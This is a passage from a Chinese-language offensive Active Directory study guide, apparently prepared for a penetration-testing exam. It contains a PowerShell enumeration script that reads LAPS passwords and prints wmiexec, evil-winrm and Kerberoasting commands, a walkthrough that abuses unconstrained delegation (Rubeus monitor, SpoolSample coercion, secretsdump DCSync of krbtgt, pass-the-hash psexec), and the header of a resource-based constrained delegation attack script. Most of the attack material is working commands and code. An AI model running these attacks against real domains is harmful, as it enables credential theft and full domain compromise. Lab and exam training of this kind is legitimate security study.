     委派属性的**写入**在 m12-delegation-attacks.ps1（RBCD 模式）。
  3) 文档未列 SPN/MAQ/特权组三个子项，这里补齐，供场景 51/52 直接取用。
#>
[CmdletBinding()]
param(
    [ValidateSet('All','Domain','Users','Groups','Computers','SPN','Delegation','ACL','LAPS','Help')]
    [string]$Mode = 'All',
    [string]$ComputerName = '',        # LAPS 模式：单台机器（TARGET），可带或不带 $
    [string]$Domain = '',              # DOMAIN：域 FQDN，留空=当前域
    [string]$SearchRoot = '',          # 覆盖搜索根 DN，留空=defaultNamingContext
    [string]$AclTarget = '',           # ACL 模式：目标对象 DN，留空=域根
    [int]$MaxResults = 0,              # 0=不限，>0 截断输出（大域先用 50 试水）
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

# ---------------------------------------------------------------------------
# 基础：搜索根 / 域 SID / 通用搜索器
# ---------------------------------------------------------------------------
$script:RootPath = ''
$script:DomainSID = ''
$script:DomainFqdn = ''

function Initialize-M12Root {
    if ($SearchRoot) {
        $script:RootPath = "LDAP://$SearchRoot"
    } elseif ($Domain) {
        # corp.local -> DC=corp,DC=local
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        $script:RootPath = "LDAP://$dn"
        $script:DomainFqdn = $Domain
    } else {
        $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
        $nc = $rootDse.Properties['defaultNamingContext']
        if (-not $nc -or $nc.Count -eq 0) {
            throw "取不到 defaultNamingContext：本机未加域或 LDAP 不可达。请显式给 -Domain DOMAIN"
        }
        $script:RootPath = "LDAP://$($nc[0])"
        $script:DomainFqdn = (($nc[0] -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(3) }) -join '.'
    }
    # 域 SID
    $domEntry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $sidBytes = $domEntry.Properties['objectSid'].Value
    if ($sidBytes) {
        $script:DomainSID = (New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)).Value
    }
    if (-not $script:DomainFqdn) {
        $script:DomainFqdn = (($script:RootPath -split ',') | Where-Object { $_ -like 'DC=*' } |
            ForEach-Object { $_.Substring(4) }) -join '.'
    }
}

function New-M12Searcher {
    param(
        [Parameter(Mandatory = $true)][string]$Filter,
        [string[]]$Properties = @('sAMAccountName'),
        [int]$PageSize = 200
    )
    $entry = New-Object System.DirectoryServices.DirectoryEntry($script:RootPath)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = $entry
    $s.Filter = $Filter
    $s.PageSize = $PageSize
    $s.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
    foreach ($p in $Properties) { [void]$s.PropertiesToLoad.Add($p) }
    return $s
}

# 取搜索结果里的某个属性（不存在返回 $null，多值取第一个）
function Get-M12Prop {
    param($Result, [string]$Name)
    if ($Result.Properties.Contains($Name) -and $Result.Properties[$Name].Count -gt 0) {
        return $Result.Properties[$Name][0]
    }
    return $null
}

function Convert-M12FileTime {
    param($Raw)
    if (-not $Raw) { return '' }
    try {
        $ft = [Convert]::ToInt64($Raw)
        if ($ft -le 0) { return '' }
        return [DateTime]::FromFileTime($ft).ToString('yyyy-MM-dd HH:mm:ss')
    } catch { return [string]$Raw }
}

# userAccountControl 关键位（考试只记这几个就够）
function Convert-M12Uac {
    param($Raw)
    if (-not $Raw) { return '' }
    $v = 0
    try { $v = [Convert]::ToInt32($Raw) } catch { return [string]$Raw }
    $flags = @()
    if ($v -band 0x000002)  { $flags += 'DISABLED' }
    if ($v -band 0x000020)  { $flags += 'PasswdNotReqd' }
    if ($v -band 0x002000)  { $flags += 'PASSWD_NOT_EXPIRED' }
    if ($v -band 0x020000)  { $flags += 'DONT_REQ_PREAUTH(ASREP)' }
    if ($v -band 0x040000)  { $flags += 'TrustedForDelegation(非约束)' }
    if ($v -band 0x080000)  { $flags += 'NOT_DELEGATED(敏感不可委派)' }
    if ($v -band 0x100000)  { $flags += 'USE_DES_ONLY' }
    if ($v -band 0x200000)  { $flags += 'TrustedToAuthForDelegation(协议转换)' }
    return ($flags -join ',')
}

function Write-M12Head {
    param([string]$Text)
    Write-Output ""
    Write-Output "===== $Text ====="
}

function Limit-M12Rows {
    param($Rows)
    if ($MaxResults -gt 0) { return @($Rows | Select-Object -First $MaxResults) }
    return @($Rows)
}

# ---------------------------------------------------------------------------
# Domain：域信息 + MAQ（场景 51 要确认 MachineAccountQuota > 0）
# ---------------------------------------------------------------------------
function Get-M12DomainInfo {
    Write-M12Head "域信息（Domain）"
    Write-Output "搜索根   : $script:RootPath"
    Write-Output "域 FQDN  : $script:DomainFqdn"
    Write-Output "域 SID   : $script:DomainSID"
    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Output "当前身份 : $($me.Name)  (认证类型 $($me.AuthenticationType))"

    $s = New-M12Searcher -Filter '(objectClass=domainDNS)' `
        -Properties @('distinguishedName','ms-DS-MachineAccountQuota','msDS-Behavior-Version')
    $r = $s.FindOne()
    if ($r) {
        $maq = Get-M12Prop $r 'ms-DS-MachineAccountQuota'
        if ($maq) {
            Write-Output "MachineAccountQuota : $maq   (场景 51 RBCD 需要 > 0，默认 10)"
        } else {
            Write-Output "MachineAccountQuota : 未读取到（老域或权限不足，按 10 估，RBCD 加机器失败时再确认）"
        }
        $func = Get-M12Prop $r 'msDS-Behavior-Version'
        if ($func) { Write-Output "域功能级别 msDS-Behavior-Version : $func" }
    }

    # DC 列表
    Write-Output ""
    Write-Output "--- 域控制器（从 configuration 分区不可靠时退回 Computers 容器近似）---"
    $s2 = New-M12Searcher -Filter '(&(objectCategory=computer)(primaryGroupID=516))' `
        -Properties @('dnsHostName','operatingSystem')
    foreach ($c in $s2.FindAll()) {
        Write-Output ("DC  : " + (Get-M12Prop $c 'dnsHostName'))
    }
}

# ---------------------------------------------------------------------------
# Users
# ---------------------------------------------------------------------------
function Get-M12Users {
    Write-M12Head "域用户（Users）—— 关注 description 明文口令 / adminCount=1 / 免预认证"
    $s = New-M12Searcher -Filter '(&(objectCategory=person)(objectClass=user))' `
        -Properties @('sAMAccountName','userPrincipalName','description','adminCount','pwdLastSet','lastLogon','userAccountControl','servicePrincipalName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            SamAccountName = (Get-M12Prop $r 'sAMAccountName')
            UPN            = (Get-M12Prop $r 'userPrincipalName')
            AdminCount     = (Get-M12Prop $r 'adminCount')
            UAC            = (Convert-M12Uac (Get-M12Prop $r 'userAccountControl'))
            LastLogon      = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
            Description    = (Get-M12Prop $r 'description')
        }
    }
    Limit-M12Rows $rows | Sort-Object SamAccountName |
        Format-Table -AutoSize SamAccountName, UPN, AdminCount, UAC, LastLogon, Description |
        Out-String -Width 220 | Write-Output
    Write-Output "AS-REP Roasting 候选（UAC 含 DONT_REQ_PREAUTH）："
    $s3 = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' `
        -Properties @('sAMAccountName')
    foreach ($r in $s3.FindAll()) { Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName')) }
}

# ---------------------------------------------------------------------------
# Groups：全组 + 特权组成员（按 well-known RID，语言无关的写法）
# ---------------------------------------------------------------------------
function Get-M12Groups {
    Write-M12Head "特权组成员（Groups）—— 用 SID RID 定位，不受中英文组名影响"
    if (-not $script:DomainSID) {
        Write-Output "[!] 拿不到域 SID，跳过特权组解析（试试用 -Domain DOMAIN 显式指定）"
        return
    }
    $rids = @{
        '512' = 'Domain Admins'
        '519' = 'Enterprise Admins'
        '518' = 'Schema Admins'
        '544' = 'Builtin Administrators'
    }
    foreach ($rid in ($rids.Keys | Sort-Object)) {
        $sid = "$script:DomainSID-$rid"
        $s = New-M12Searcher -Filter "(objectSid=$sid)" -Properties @('sAMAccountName','member','description')
        $r = $s.FindOne()
        if (-not $r) { continue }
        Write-Output ("--- {0} ({1}) ---" -f $rids[$rid], (Get-M12Prop $r 'sAMAccountName'))
        $members = $r.Properties['member']
        if ($members) { foreach ($m in $members) { Write-Output ("  " + $m) } }
        else { Write-Output "  (无成员)" }
    }

    Write-M12Head "全部组（名称 + 成员数）"
    $s2 = New-M12Searcher -Filter '(objectClass=group)' -Properties @('sAMAccountName','member','adminCount')
    $rows = @()
    foreach ($r in $s2.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Group      = (Get-M12Prop $r 'sAMAccountName')
            AdminCount = (Get-M12Prop $r 'adminCount')
            Members    = ($r.Properties['member']).Count
        }
    }
    Limit-M12Rows $rows | Sort-Object Group | Format-Table -AutoSize Group, AdminCount, Members |
        Out-String -Width 160 | Write-Output
}

# ---------------------------------------------------------------------------
# Computers
# ---------------------------------------------------------------------------
function Get-M12Computers {
    Write-M12Head "域计算机（Computers）—— 关注 OS（老系统=本地提权面）与登录时间"
    $s = New-M12Searcher -Filter '(objectClass=computer)' `
        -Properties @('sAMAccountName','dnsHostName','operatingSystem','operatingSystemVersion','lastLogon','distinguishedName')
    $rows = @()
    foreach ($r in $s.FindAll()) {
        $rows += New-Object PSObject -Property @{
            Name      = (Get-M12Prop $r 'sAMAccountName')
            DnsHost   = (Get-M12Prop $r 'dnsHostName')
            OS        = (Get-M12Prop $r 'operatingSystem')
            OSVer     = (Get-M12Prop $r 'operatingSystemVersion')
            LastLogon = (Convert-M12FileTime (Get-M12Prop $r 'lastLogon'))
        }
    }
    Limit-M12Rows $rows | Sort-Object Name | Format-Table -AutoSize Name, DnsHost, OS, OSVer, LastLogon |
        Out-String -Width 200 | Write-Output
}

# ---------------------------------------------------------------------------
# SPN：Kerberoast 候选
# ---------------------------------------------------------------------------
function Get-M12Spn {
    Write-M12Head "SPN 账户（Kerberoast 候选，场景 52 的服务账户也在这）"
    $s = New-M12Searcher -Filter '(&(servicePrincipalName=*)(!(objectClass=computer)))' `
        -Properties @('sAMAccountName','servicePrincipalName','adminCount','pwdLastSet','userAccountControl','memberOf')
    foreach ($r in $s.FindAll()) {
        $spns = @($r.Properties['servicePrincipalName']) -join ' | '
        Write-Output ("账户 : " + (Get-M12Prop $r 'sAMAccountName'))
        Write-Output ("  SPN    : " + $spns)
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
        if ($uac) { Write-Output ("  UAC    : " + $uac) }
        $mo = $r.Properties['memberOf']
        if ($mo) { Write-Output ("  组成员 : " + (@($mo) -join ' | ')) }
    }
    Write-Output ""
    Write-Output "后续（攻击机）：impacket-GetUserSPNs -dc-ip TARGET DOMAIN/USER:PASS -outputfile spn.txt"
    Write-Output "               hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt"
}

# ---------------------------------------------------------------------------
# Delegation：非约束 / 约束 / RBCD 三类
# ---------------------------------------------------------------------------
function Get-M12Delegation {
    Write-M12Head "非约束委派（UAC 0x80000=524288）—— 场景 50 的落点"
    $s = New-M12Searcher -Filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
    }
    if (-not $found) { Write-Output "  (无)" }

    Write-M12Head "约束委派（msDS-AllowedToDelegateTo）—— 场景 52 的服务账户"
    $s2 = New-M12Searcher -Filter '(msDS-AllowedToDelegateTo=*)' `
        -Properties @('sAMAccountName','msDS-AllowedToDelegateTo','userAccountControl')
    $found = $false
    foreach ($r in $s2.FindAll()) {
        $found = $true
        $uac = Convert-M12Uac (Get-M12Prop $r 'userAccountControl')
        Write-Output ("  账户 : " + (Get-M12Prop $r 'sAMAccountName') + ("  [{0}]" -f $uac))
        foreach ($t in $r.Properties['msDS-AllowedToDelegateTo']) { Write-Output ("      可委派到 : " + $t) }
    }
    if (-not $found) { Write-Output "  (无)" }

    Write-M12Head "RBCD（msDS-AllowedToActOnBehalfOfOtherIdentity 已有值）—— 场景 51 的目标机"
    $s3 = New-M12Searcher -Filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' `
        -Properties @('sAMAccountName','dnsHostName','distinguishedName')
    $found = $false
    foreach ($r in $s3.FindAll()) {
        $found = $true
        Write-Output ("  " + (Get-M12Prop $r 'sAMAccountName') + "  " + (Get-M12Prop $r 'dnsHostName'))
        Write-Output ("      DN : " + (Get-M12Prop $r 'distinguishedName'))
    }
    if (-not $found) { Write-Output "  (无，说明还没人动过这个属性，正好是我们能写的状态)" }
    Write-Output ""
    Write-Output "下一步：RBCD 配置走 m12-delegation-attacks.ps1 -Mode RBCD"
}

# ---------------------------------------------------------------------------
# ACL：只读摘要 + 高危权限高亮
# ---------------------------------------------------------------------------
function Get-M12AclSummary {
    $target = $AclTarget
    if (-not $target) { $target = $script:RootPath -replace '^LDAP://', '' }
    Write-M12Head "ACL 摘要（只读）：$target"
    $interesting = @('GenericAll','GenericWrite','WriteDacl','WriteOwner','ExtendedRight','CreateChild','Delete','WriteProperty','Self')
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$target")
    try {
        $rules = $de.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
    } catch {
        Write-Output "[!] 读 ACL 失败：$($_.Exception.Message)（对目标对象无 READ_CONTROL 权限或 DN 写错）"
        Write-Output "    确认 DN 用 -Mode Computers 输出的 distinguishedName，别写容器名。"
        return
    }
    $rows = @()
    foreach ($rule in $rules) {
        $rights = [string]$rule.ActiveDirectoryRights
        $hit = ''
        foreach ($i in $interesting) {
            if (($rule.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]$i) -ne 0) {
                $hit = 'YES'
                break
            }
        }
        if (-not $hit) { continue }
        $who = $rule.IdentityReference.Value
        try { $who = $rule.IdentityReference.Translate([System.Security.Principal.NTAccount]).Value } catch { }
        $rows += New-Object PSObject -Property @{
            Principal = $who
            Rights    = $rights
            Type      = [string]$rule.AccessControlType
            ObjectType= [string]$rule.ObjectType
            Inherited = $rule.IsInherited
        }
    }
    if ($rows.Count -eq 0) {
        Write-Output "未发现 GenericAll/GenericWrite/WriteDacl/WriteOwner 等高危条目（或当前身份读不到 ACL）。"
    } else {
        $rows | Sort-Object Principal | Format-Table -AutoSize Principal, Rights, Type, ObjectType, Inherited |
            Out-String -Width 220 | Write-Output
    }
    Write-Output "说明：ObjectType 是属性/扩展权限的 GUID；判 LAPS 可读权限时看它是否等于"
    Write-Output "      ms-Mcs-AdmPwd 的 schema GUID（用 -Mode LAPS 的实测结果判定更快）。"
}

# ---------------------------------------------------------------------------
# LAPS：legacy(ms-Mcs-AdmPwd*) + Windows LAPS(msLAPS-*) + 可读性判定
# ---------------------------------------------------------------------------
function Get-M12Laps {
    Write-M12Head "LAPS 枚举（场景 49）"

    $name = $ComputerName
    if ($name -and -not $name.EndsWith('$')) { $name = "$name`$" }
    if ($name) {
        $filter = "(&(objectClass=computer)(sAMAccountName=$name))"
    } else {
        # 先探测"哪些机器装了 LAPS"：过期时间属性默认域用户可读，是存在性判据
        $filter = '(|(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*)(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))'
    }
    $props = @('sAMAccountName','dnsHostName','distinguishedName',
               'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime',
               'msLAPS-Password','msLAPS-PasswordExpirationTime','msLAPS-EncryptedPassword')
    $s = New-M12Searcher -Filter $filter -Properties $props

    $legacyHits = 0
    $winlapsHits = 0
    $encHits = 0
    $lastDns = 'TARGET'
    foreach ($r in $s.FindAll()) {
        $host1 = Get-M12Prop $r 'sAMAccountName'
        $dns   = Get-M12Prop $r 'dnsHostName'
        if ($dns) { $lastDns = $dns }
        $pwd   = Get-M12Prop $r 'ms-Mcs-AdmPwd'
        $exp   = Convert-M12FileTime (Get-M12Prop $r 'ms-Mcs-AdmPwdExpirationTime')
        $wpwd  = Get-M12Prop $r 'msLAPS-Password'
        $wexp  = Get-M12Prop $r 'msLAPS-PasswordExpirationTime'
        $wenc  = Get-M12Prop $r 'msLAPS-EncryptedPassword'

        Write-Output ("机器 : {0}  ({1})" -f $host1, $dns)
        if ($pwd) {
            $legacyHits++
            Write-Output ("  [legacy LAPS] ms-Mcs-AdmPwd = {0}   (过期时间 {1})" -f $pwd, $exp)
            Write-Output ("  执行：impacket-wmiexec DOMAIN/Administrator@{0} -p '{1}'" -f $dns, $pwd)
        }
        if ($wpwd) {
            $winlapsHits++
            Write-Output ("  [Windows LAPS 明文模式] msLAPS-Password = {0}" -f $wpwd)
        }
        if ($wenc) {
            $encHits++
            Write-Output ("  [Windows LAPS 加密模式] msLAPS-EncryptedPassword 存在（{0} 字节），纯 LDAP 解不出明文" -f @($wenc).Count)
        }
        if (-not $pwd -and -not $wpwd -and -not $wenc) {
            Write-Output ("  只有过期时间({0})没有密码值 -> LAPS 已部署，但**当前身份无读权限**" -f $exp)
        }
    }

    Write-Output ""
    Write-Output "--- 可读性判定结论 ---"
    if (($legacyHits + $winlapsHits) -gt 0) {
        Write-Output "当前身份**能**读到明文密码 -> 场景 49 成立，直接用上面的 wmiexec 命令落地。"
        Write-Output "只开 WinRM 时换：evil-winrm -i $lastDns -u Administrator -p '<读到的密码>'"
    } elseif ($encHits -gt 0) {
        Write-Output "只看到 msLAPS-EncryptedPassword（DPAPI 加密）：纯 LDAP 拿不到明文。"
        Write-Output "备选：① 找仍用 legacy LAPS 的机器；② 找开了 msLAPS-Password 明文模式的机器；"
        Write-Output "      ③ 在已控的域管/本机管理员会话里用 Windows LAPS 模块读："
        Write-Output "         Get-LapsADPassword -Identity TARGET -AsPlainText   （Windows LAPS，RSAT/PowerShell 7 环境）"
        Write-Output "         msiexec 装的 legacy LAPS 客户端 PowerShell 模块：Import-Module AdmPwd.PS"
        Write-Output "         Get-AdmPwdPassword -ComputerName TARGET"
    } else {
        Write-Output "没读到任何密码属性：① 域里没部署 LAPS；② 当前用户对 ms-Mcs-AdmPwd 无读权限。"
        Write-Output "换个角度：找本域里对 LAPS 属性有 ReadProperty 的主体（PowerView 写法见"
        Write-Output "m12-laps-and-trust-notes.md），或改用 RBCD/委派/证书入口先拿到更高身份。"
    }

    Write-Output ""
    Write-Output "--- 本地是否装了 LAPS 客户端（判断版本用）---"
    foreach ($p in @('C:\Program Files\LAPS\CSE\Admpwd.dll', 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll')) {
        if (Test-Path $p) { Write-Output ("  存在 legacy LAPS CSE: " + $p) }
    }
    Write-Output "  Windows LAPS：Windows 11/2022+ 内置，查注册表 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS"
    Write-Output "              或用 Get-LapsADPassword 是否可用来判断。"
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12Help {
    Write-Output @"

m12-ad-enum-windows.ps1 —— 纯 ADSI 域枚举（无 RSAT / 无 PowerView）

  .\m12-ad-enum-windows.ps1 -Mode All
      跑全部：Domain / Users / Groups / Computers / SPN / Delegation / ACL / LAPS
  .\m12-ad-enum-windows.ps1 -Mode Domain     [-Domain corp.local]
      域 SID / MAQ（RBCD 加机器前提）/ 当前身份 / DC 列表
  .\m12-ad-enum-windows.ps1 -Mode Users      [-MaxResults 50]
      用户 + AS-REP Roasting 候选
  .\m12-ad-enum-windows.ps1 -Mode Groups
      特权组成员（DA/EA/Schema/Builtin Admins）+ 全组清单
  .\m12-ad-enum-windows.ps1 -Mode Computers
      计算机 + OS + 最后登录
  .\m12-ad-enum-windows.ps1 -Mode SPN
      Kerberoast 候选 + 服务账户（场景 52）
  .\m12-ad-enum-windows.ps1 -Mode Delegation
      非约束 / 约束 / RBCD 三类（场景 50/51/52）
  .\m12-ad-enum-windows.ps1 -Mode ACL [-AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"]
      只读 ACL 摘要，高亮 GenericAll/GenericWrite/WriteDacl/WriteOwner
  .\m12-ad-enum-windows.ps1 -Mode LAPS [-ComputerName WS02]
      LAPS 两版读取 + 可读性判定（场景 49）

占位符：DOMAIN=corp.local  TARGET=WS02  USER/PASS 只出现在打印的后续命令里。
本脚本只做读操作，不改任何目录对象；写委派属性见 m12-delegation-attacks.ps1。
"@
}

# ---------------------------------------------------------------------------
# 主流程
# ---------------------------------------------------------------------------
if ($Help) { Show-M12Help; return }

try {
    Initialize-M12Root
} catch {
    Write-Output "[!] 初始化失败：$($_.Exception.Message)"
    Write-Output "    解决：显式给 -Domain DOMAIN（如 -Domain corp.local），或确认本机在域内且 DC 可达。"
    exit 1
}

switch ($Mode) {
    'All'       { Get-M12DomainInfo; Get-M12Users; Get-M12Groups; Get-M12Computers
                  Get-M12Spn; Get-M12Delegation; Get-M12AclSummary; Get-M12Laps }
    'Domain'    { Get-M12DomainInfo }
    'Users'     { Get-M12Users }
    'Groups'    { Get-M12Groups }
    'Computers' { Get-M12Computers }
    'SPN'       { Get-M12Spn }
    'Delegation'{ Get-M12Delegation }
    'ACL'       { Get-M12AclSummary }
    'LAPS'      { Get-M12Laps }
    'Help'      { Show-M12Help }
}

Write-Output ""
Write-Output "[*] 完成 -Mode $Mode。委派/RBCD 落地：m12-delegation-attacks.ps1；"
Write-Output "[*] Linux 侧同款枚举：scripts/linux/m12-ad-enum-linux.sh；信任与 Extra SID：scripts/infra/m12-laps-and-trust-notes.md"
````

## 场景 50：控制了非约束委派机器，但还没有域级身份

**场景回顾**：已控制一台配置**非约束委派（Trusted for Delegation）**的机器（能跑 Rubeus/触发认证）；还没有任何域管理身份。下一步取决于能否让高价值身份（DC 机器账户或域管）向该机器认证并截获其 TGT。

**前提与假设**：目标 DC/域管的 SPN 端口（445/5985 或 88 回连）可达该非约束主机；非约束主机上以 SYSTEM 运行抓票工具。DC 机器账户的 TGT 一旦到手 = 可 DCSync（DC 有复制权限）；域管的 TGT = 直接冒充。

**准备（攻击机侧）**：非约束主机上准备 `Rubeus.exe` + 认证触发器（`SpoolSample.exe` / `printerbug` / `PetitPotam`）；攻击机准备 `impacket-ticketConverter` 与 `secretsdump`。诱导认证触发方式见 `m12-delegation-attacks.ps1 -Mode Unconstrained`。

**执行步骤**：
```powershell
# ① 非约束主机（SYSTEM）后台开抓票
Rubeus.exe monitor /interval:5 /nowrap
# ② 另开窗口诱导 DC 认证到本机（本机即被控非约束主机）
SpoolSample.exe DC01 $env:COMPUTERNAME        # 或 printerbug DC01 $env:COMPUTERNAME
# ③ monitor 输出出现 DC01$ 的 base64 TGT → 存成 dc.txt
```
```bash
# ④ 攻击机转换并利用
impacket-ticketConverter dc.txt dc.ccache
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass DC01.corp.local        # DC 机器账户 → DCSync krbtgt/域管哈希
impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  # 拿到哈希后
```
**用到的脚本**：`scripts/powershell/m12-delegation-attacks.ps1`（Rubeus monitor + 触发 + base64 导出模板；Linux 侧转换命令也在注释里）。

**验证**：`secretsdump` 能 dump 出 `krbtgt`/管理员哈希即证明拿到的是 DC 机器 TGT；先 `klist` 看主体是否为 `DC01$`。

**失败分支与备选**：
- SpoolSample 无回显/报错（补丁打了或 RPC 被封）→ 换诱导向量：`PetitPotam`(EFSRPC)、`DFSCoerce`、MS-RPRN 变体 `dementor`；仍不行 → 被动等：Rubeus monitor 挂着，等待真实域管登录本机或访问本机服务。
- 抓到的是普通用户 TGT（不是 DC/域管）→ 用它先横向（该用户能访问的机器），或继续等更高价值认证；也可用 `Rubeus harvest` 思路扩大覆盖面。
- 非约束主机与 DC 不在可达网段 → 无法诱导认证时，该主机价值只剩"被动收集"，回到枚举找其他入口（不要把时间耗在不可能的回连上）。

**考试注意 OPSEC**：非约束主机上跑 `Rubeus monitor` 会持续抓所有认证，日志明显——任务完成（拿到 DC 票）就停；抓到的票第一时间导出到攻击机再清理本机 base64 文本。不要拿域管 TGT 直接 `psexec` 乱跳，先 `secretsdump` 确认价值再决定最小动作。

---

#### 源码 `scripts/powershell/m12-delegation-attacks.ps1` {#scripts-powershell-m12-delegation-attacks-ps1}

````powershell
<#
用途：委派三件套的 Windows 侧落地脚本——
      RBCD：查询 / 配置（把假机器账户 SID 写进目标机的
            msDS-AllowedToActOnBehalfOfOtherIdentity）/ 回滚，纯 ADSI + .NET 实现；
      约束委派：枚举服务账户的 msDS-AllowedToDelegateTo，并给出 S4U2Self+S4U2Proxy
            两种子情形（有/无协议转换）的 Rubeus s4u 与 impacket-getST 命令模板；
      非约束委派：利用前的四项前置检查 + Rubeus monitor / 诱导认证命令模板。
场景：M12 场景 50（非约束抓 DC TGT）、51（RBCD 冒充管理员）、52（约束委派到指定 SPN）。
依赖：ADSI / System.DirectoryServices / System.Security.AccessControl（系统自带，
      不需要 RSAT 的 ActiveDirectory 模块）；
      Rubeus.exe（s4u / monitor / ptt，需自行投递到本机，用 -ToolDir 指目录）；
      SpoolSample.exe 或 printerbug（非约束场景的诱导认证触发器，可选）；
      默认只打印命令，加 -Execute 才真正调用外部 exe（避免误触发）。
使用：# 51 RBCD：写入并打印攻击机侧后续命令
      .\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
      # 51 RBCD：任务完成后必须回滚
      .\m12-delegation-attacks.ps1 -Mode RBCD-Rollback -TargetComputer WS02
      # 52 约束委派：看 svc_sql 能委派到哪，并打印两种情形的命令
      .\m12-delegation-attacks.ps1 -Mode Constrained -ServiceAccount svc_sql -Spn 'cifs/WS02.corp.local'
      # 50 非约束：利用前体检 + 抓票/触发命令
      .\m12-delegation-attacks.ps1 -Mode Unconstrained -ToolDir C:\Tools -Execute
      # 只枚举三类委派现状
      .\m12-delegation-attacks.ps1 -Mode Enum
占位符：DOMAIN=域 FQDN（corp.local） TARGET=目标主机（WS02）
      USER/PASS=已知凭据（Rubeus s4u 需要服务账户的明文或 rc4/aes）
      ——脚本内不写真实域名/口令，全部由参数传入或打印为占位符供替换。
测试状态：未在 Windows 域环境实测；本机括号/引号配对检查通过。RBCD 写入用的是公开
      通用的 RawSecurityDescriptor 二进制写法（等价 PowerView Set-DomainObject），
      需要当前身份对目标计算机对象有 GenericWrite/GenericAll 或写该属性的权限。
与 docs/12-ad-attacks.md 的差异说明：
  1) 文档 51 场景只给了 impacket 侧流程，把"写 AllowedToAct"留给本脚本——本脚本
     RBCD 模式**只写属性**，不生成机器账户（加机器在攻击机用 impacket-addcomputer，
     -FakeAccount 指代你已建好的账户；若用已控服务账户当假主体同样适用）。
  2) 文档说"用 .NET ADSI 写安全描述符，不依赖 ActiveDirectory 模块"——实现一致，
     但注意写入前若属性已有值会先 Clear 再写，不留残留 ACE。
  3) 约束委派的票据请求本身（S4U2Self/S4U2Proxy）无法用纯 .NET 完成，脚本用
     WindowsIdentity 做身份与委派前提自检，实际票据请求给出 Rubeus / impacket
     两套可复制命令（文档同理只给模板）。
#>
[CmdletBinding()]
param(
    [ValidateSet('Enum','RBCD','RBCD-Rollback','Constrained','Unconstrained','Help')]
    [string]$Mode = 'Enum',
    [string]$TargetComputer = '',      # TARGET：RBCD 的目标机 / 非约束场景的本机
    [string]$FakeAccount = '',         # 假机器账户 sAMAccountName，如 FAKE01$
    [string]$ServiceAccount = '',      # 约束委派的服务账户，如 svc_sql
    [string]$ImpersonateUser = 'Administrator',  # 要冒充的目标用户
    [string]$Spn = '',                 # 目标服务 SPN，如 cifs/WS02.corp.local
    [string]$Domain = '',              # DOMAIN：域 FQDN，留空=当前域
    [string]$ToolDir = '.',            # Rubeus.exe / SpoolSample.exe 所在目录
    [switch]$Execute,                  # 真的调用 Rubeus / 触发器（默认只打印）
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

# 把常用参数挂到 script 作用域，供各函数读取（函数内不依赖调用方局部作用域）
$script:ToolDir = $ToolDir
$script:ImpersonateUser = $ImpersonateUser

# ---------------------------------------------------------------------------
# 公共：搜索根 / SID / 计算机对象
# ---------------------------------------------------------------------------
function Initialize-M12dRoot {
    if ($Domain) {
        $parts = $Domain.Split('.') | Where-Object { $_ -ne '' }
        $dn = ($parts | ForEach-Object { "DC=$_" }) -join ','
        return "LDAP://$dn"
    }
    $rootDse = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
    $nc = $rootDse.Properties['defaultNamingContext']
    if (-not $nc -or $nc.Count -eq 0) {
        throw "取不到 defaultNamingContext：未加域或 LDAP 不可达，请用 -Domain DOMAIN 显式指定"
    }
    return "LDAP://$($nc[0])"
}

function Get-M12dSid {
    param([Parameter(Mandatory = $true)][string]$SamAccountName)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$SamAccountName)"
    $s.PageSize = 10
    [void]$s.PropertiesToLoad.Add('objectSid')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    if (-not $r) { throw "域里找不到账户 $SamAccountName（机器账户要带结尾的 $）" }
    $sid = New-Object System.Security.Principal.SecurityIdentifier($r.Properties['objectSid'][0], 0)
    return @($sid.Value, [string]$r.Properties['distinguishedName'][0])
}

function Get-M12dComputerDn {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $name = $ComputerName
    if (-not $name.EndsWith('$')) { $name = "$name`$" }
    $info = Get-M12dSid $name
    return $info[1]
}

function Write-M12dHead { param([string]$T) Write-Output ""; Write-Output "===== $T =====" }

